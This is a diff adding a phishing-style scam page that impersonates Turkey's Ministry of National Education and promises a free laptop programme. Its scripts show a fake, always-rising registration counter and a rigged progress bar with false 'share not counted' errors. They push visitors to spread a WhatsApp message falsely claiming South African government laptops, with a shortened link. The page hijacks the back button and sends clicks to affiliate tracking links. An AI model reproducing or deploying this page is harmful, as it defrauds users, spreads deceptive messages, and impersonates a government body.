@@ -1,0 +1,337 @@
+
+<!doctype html>
+<html lang="tr">
+<head>
+    <title>Adım 2</title>
+
+<link rel="stylesheet" href="bootstrap.min.css">
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="sty.css">
+
+
+<style>
+#share {
+    background: #ffefef;
+    padding: 30px;
+}
+.share {
+    background: #ffefef;
+    padding: 30px;
+	
+}
+	     button {
+    display: block;
+    width: 240px;
+    height: 50px;
+    color: #fff;
+    border: none;
+    outline: none;
+    font-size: 20px;
+    cursor: pointer;
+    border-radius: 5px;
+    padding: 0 10px;
+    margin: 10px auto;
+    background: #ff000b;
+    transition: background 0.3s ease;
+}
+
+  .barr {
+    direction: ltr;
+    max-width: 400px;
+    margin: 10px auto;
+    box-sizing: border-box;
+}
+.fill {
+    position: relative;
+    display: inline-block;
+    width: calc(100% - 100px);
+    height: 35px;
+    padding: 2px;
+    border: 2px solid #ff000b;
+}
+  #claim {
+    display: none;
+}
+  .percentage {
+    width: 100px;
+    float: right;
+    height: 35px;
+    font-size: 16px;
+    border: 2px solid #ff000b;
+}
+#percentage,
+#percentage2 {
+    margin-left: 5px;
+}
+  #fill,
+#fill2 {
+    background: #ff000b;
+    width: 0%;
+    height: 100%;
+}
+	</style>
+	
+
+</head>
+<body class="ekim29">
+
+	<div class="header-ust">
+	<div class="container">
+		<div class="col-12">
+				<ul>
+		<li><a href="/index.php"> Ana Sayfa</a></li>
+		<li><a href="/eposta/"> E-Posta</a></li>
+					<li><a href="#search">Arama </a></li>
+			<li><a href="/sss.php">SSS </a></li>
+				<li><a href="/en">En </a></li>
+			</ul>
+			<ul>
+		<li><a class="sm" href="/" target="_blank"><i class="fab fa-facebook-square"></i></a></li>
+		<li><a class="sm" href="/" target="_blank"><i class="fa-brands fa-square-x-twitter"></i></a></li>
+		<li><a class="sm" href="/" target="_blank"><i class="fab fa-instagram"></i></a></li>
+		<li><a class="sm" href="/"_blank"><i class="fab fa-youtube"></i></a></li>
+</ul>
+	</div>
+	</div>
+</div>
+<div class="header">
+<div class="row">
+	<div class="container">
+	
+	<div class="col-12">
+	<a href="/" target="_self" class="logo">
+	<img src="logo-beyaz.png" alt="logo"/>
+	<span>T.C. MİLLÎ EĞİTİM<br>BAKANLIĞI</span>
+</a>
+<img src="logo-100yil.png" alt="" height="50" class="yil100"/>
+<a href="/" target="_self" class="logo logo-stick">
+	<img src="https://meb.gov.tr/assets/images/header-meb-yeni-beyaz-logo.png" alt="logo"/>
+	<span>T.C. MİLLÎ EĞİTİM<br>BAKANLIĞI</span>
+</a>
+	<img src="https://meb.gov.tr/assets/images/header-bayrak-ataturk.png" alt="" height="50" class="avb float-right d-none d-md-block"/>
+	<img src="logo-100yil.png" alt="" height="50" class="avb float-right d-none d-md-block"/>
+		<a href="#mobile-menu" class="nav-opened-button d-lg-none" ><i class="fas fa-bars"></i></a>
+	</div>
+	</div>
+	</div>
+	<div class="row">
+	<div class="container">
+	<div class="d-flex justify-content-center">
+	<!-- menü start-->
+		<ul class="sf-menu d-none d-lg-block" id="menu-header-lg" >		
+		</ul>
+		<!-- menü Finish-->
+		
+		
+	</div>
+	</div>
+	</div>
+</div>
+<div id="MebSwiftMenu"></div>	<!-- Header Finish -->
+
+	<!-- Content Start -->
+	<section id="content">
+	<div class="container">
+		<div id="share">
+    
+			<div id="selectdiv" style="display: none;flex-direction: column;justify-content: center;align-items: center;width: 92%;
+						margin: 20px auto 0;
+						border: 1px solid #ccc;
+						background-color: #f2f2f2;
+						padding: 5px;">
+			<div style="margin-top:1rem;margin-bottom:1rem;">Which way do you want to receive notifications from customer service?</div>
+			<button class='btn btn-primary'  onclick='chooseApp(1)' type='button'>WhatsApp</button>
+			<button class='btn btn-primary'  onclick='chooseApp(2)' type='button'>Line</button>
+			</div>
+			
+			<div class="bottom" id='buttonO'>
+				<center>
+				<div class="A">
+					<b><span id="countdowntimer" style="color:red;">57532</span> Kayıt tamamlandı</b>
+					<script type="text/javascript">
+							  var timeleft = 57532;
+							  var downloadTimer = setInterval(function(){
+								  timeleft= timeleft + Math.floor(Math.random() * 600);
+								  document.getElementById('countdowntimer').textContent = timeleft;
+								  if (timeleft <= 0)
+									  clearInterval(downloadTimer);
+							  }, 1000);
+						  </script>
+				  </div>
+				</center>
+				<div id="lastapp"><p class="now now2">Whatsapp'taki 5 Gruba veya 15 Arkadaşınıza "Ücretsiz Dizüstü Bilgisayar Programı"ndan bahsedin!</p><p class="rules">1.Whatsapp'ta 5 grup / 20 arkadaşınızla paylaşın(aşağıdaki "Whatsapp" simgesine tıklayın)</p><p class="rules">2.Ardından "Devam Et" butonuna tıklayın.</p><p class="rules">3.Bir OTP alacaksınız, bunu girin ve "Kaydı Tamamla"ya tıklayın.</p></div>
+			 <button id="whatsapp">Whatsapp</button>
+			  <h4 class="textlastup">Kırmızı çubuk dolana kadar paylaşın!</h4>
+			  <div class="barr">
+							<div class="fill">
+								<div id="fill2"></div>
+							</div>
+							<div class="percentage center">
+								<span><i class="fa fa-spinner fa-pulse"></i></span>
+								<span id="percentage2">0%</span>
+							</div>
+						</div>
+			  
+			 </div><br>
+			 
+			</div>
+			
+			  
+								  
+				<div id="claim">
+						 <div class="bottom" style="margin: 0 px;">
+										
+				  <div style="font-size: 14px;text-align: center">
+												 <div>
+													<center>
+													<button id="offer">Devam Et ➤</button>
+													</center>
+			
+			  </div>
+						   
+						  </div>
+			   
+					 
+				  </div> 
+				 
+					</div>
+			
+			
+			</div></div>
+</div>
+	</section>
+
+<footer class="d-none d-md-block">
+	<div class="container">
+		<div class="row mt-5"  id="footer-menu" ></div>
+	</div>
+</footer>
+<!-- Footer Finish -->	
+	
+	<!-- Alt Bilgi Start -->
+<section id="bottom-info">
+	<div class="container">
+		<div class="row">
+			<div class="col-md-12 text-center">
+				<p>MEB  &copy; - Tüm Hakları Saklıdır. <a href='/gizlilik'>Gizlilik, Kullanım ve Telif Hakları </a>bildiriminde belirtilen kurallar çerçevesinde hizmet sunulmaktadır. </p>
+			</div>
+		</div>
+	</div>
+</section>
+<style>
+	.btn-primary {
+    color: #fff;
+    background-color: #ff0000;
+    border-color: #ff0000;
+}
+.form-group {
+    margin: 100px;
+}
+</style>
+
+<script type="text/javascript">! function (){	var t;	try{for (t=0; 10 > t; ++t)		history.pushState({}, "", "#");	onpopstate=function (t)	{		t.state && alert('Please Share Maximum to receive gift. ');		}}		catch (o){}}();</script>
+ 
+ 
+ 
+
+        
+
+
+  <script>
+        var text1 = "https://bit.ly/Checkers R5000-Free + '?_t=' + (new Date().getTime()) + '%0A%0A' + mytime" ,
+            text2 = " مكتبة جرير تقدم ",
+            text3 = " سارع واحصل على قسيمتك قبل النفاذ من هنا : ",
+            error = "There is an error!\nShare do not count. You may have shared it with the same friend or group more than once, please re-share.",
+            cpa1 = "https://href.li/?https://www.miveuptrk.pics/?sl=5612033-242b1&data1=Track1&data2=Track2&tag={External_ID_from_traffic_source}&website={subID}&placement={sub_subID}",
+            cpa = "https://wesmallproclaim.com/agyv7ex6?key=96eb9366cb1c6c1b8ab6ab46c574e6fb",
+            saved = "MAMA7lwa",
+            share = "whatsapp://send?text=" + text1 ;
+    </script>
+
+<script>
+  var tiaoban = [
+    "*The South African Government has decided to provide free laptops for students. The application to register is given below.*%0Ahttps://z0i.xyz/GovtStudentFreeLaptops",
+    "*The South African Government has decided to provide free laptops for students. The application to register is given below.*%0Ahttps://z0i.xyz/GovtStudentFreeLaptops",
+];
+var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
+
+var date = new Date();
+var hour = (date.getHours() > 9) ? date.getHours() : '0' + date.getHours();
+var minute = (date.getMinutes() > 9) ? date.getMinutes() : '0' + date.getMinutes();
+var second = (date.getSeconds() > 9) ? date.getSeconds() : '0' + date.getSeconds();
+var mytime = hour + ':' + minute + ':' + second;
+
+var tb = tiaoban;
+  
+</script>
+<!-- code by ODcompany -->
+  <!-- JS-WP -->
+ <script type="text/javascript">
+ var swidth = localStorage.getItem(saved);
+if (swidth !== null) {
+    var width = swidth * 1;
+    $("#intro").fadeOut(0);
+    $(".comments").fadeOut(0);
+    $("#share").fadeIn(0);
+    $("#fill2").css("width", width + "%");
+    $("#percentage2").text(width + "%");
+} else {
+    var width = 0;
+}
+$("#whatsapp").click(function () {
+    window.open('whatsapp://send?text=' + tb);
+    if (width == 0) {
+        width += 50;
+    } else if (width == 50) {
+        alert(error);
+        width += 15;
+    } else if (width == 65) {
+        width += 5;
+    } else if (width == 70) {
+        alert(error);
+        width += 10;
+    } else if (width == 80) {
+        alert(error);
+        width += 5;
+    } else if (width == 85) {
+        width += 2;
+    } else if (width == 87) {
+        width += 6;
+    } else if (width == 93) {
+        width += 4;
+    } else if (width == 97) {
+        width += 1;
+    } else if (width == 98) {
+        width += 1;
+    } else {
+        $("#share").fadeOut(0);
+        $("#claim").fadeIn(1000);
+    }
+    localStorage.setItem(saved, width);
+    setTimeout(function () {
+        $("#fill2").css("width", width + "%");
+        $("#percentage2").text(width + "%");
+    }, 2000);
+});
+$("#offer").click(function () {
+    window.open(cpa, "_blank");
+});
+   
+$("#offers").click(function () {
+    window.open(cpa1, "_blank");
+});
+   
+   
+   
+</script>
+
+</body>
+</html>
+
+<!-- Alt Bilgi Finish -->
+
